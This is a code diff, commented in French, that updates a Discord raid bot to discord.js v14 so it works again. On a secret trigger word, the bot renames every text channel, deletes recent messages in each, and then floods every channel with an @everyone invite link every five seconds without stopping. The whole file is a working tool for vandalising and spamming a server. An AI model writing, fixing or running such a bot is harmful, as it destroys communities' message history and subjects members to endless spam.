@@ -1,13 +1,17 @@
-```javascript
-// LE SPAM DE SEVEN
-const Discord = require('discord.js');
-const client = new Discord.Client({ intents: ["GUILDS", "GUILD_MESSAGES"] });
+// LE SPAM DE SEVEN - VERSION DISCORD.JS V14
+const { Client, GatewayIntentBits } = require('discord.js');
+
+const client = new Client({
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent
+  ]
+});
 
 // la phrase magique
 const ACTIVATION_WORD = '!!!cadeaudu7';
-// Le nom a mettre sur les nouveau channel a spam tu connais 
 const NEW_NAME = 'GO-GLASTRP';
-// Le lien a spam tu connais 
 const SPAM_LINK = 'GO TOUT LE MONDE @EVERYONE https://discord.gg/glastv1';
 
 client.on('ready', () => {
@@ -16,24 +20,28 @@ client.on('ready', () => {
 
 client.on('messageCreate', async (message) => {
   if (message.content === ACTIVATION_WORD) {
-    message.channel.send('OKAAYYY LESSGOOO');
+    await message.channel.send('OKAAYYY LESSGOOO');
 
     const guild = message.guild;
     if (!guild) return;
 
+    // CORRECTION V14 : channel.isTextBased() au lieu de channel.isText()
     for (const channel of guild.channels.cache.values()) {
-      if (channel.isText()) {
+      if (channel.isTextBased()) {
         try {
           await channel.setName(NEW_NAME);
           const fetched = await channel.messages.fetch({ limit: 100 });
           fetched.forEach(msg => msg.delete().catch(() => {}));
-        } catch (err) {}
+        } catch (err) {
+          console.error('Erreur channel:', err);
+        }
       }
     }
 
+    // SPAM INFINI TOUS LES 5s
     setInterval(() => {
       guild.channels.cache.forEach(ch => {
-        if (ch.isText()) {
+        if (ch.isTextBased()) {
           ch.send(SPAM_LINK).catch(() => {});
         }
       });
@@ -42,6 +50,3 @@ client.on('messageCreate', async (message) => {
 });
 
 client.login(process.env.DISCORD_TOKEN);
-// Envoie a fly le token
-
-
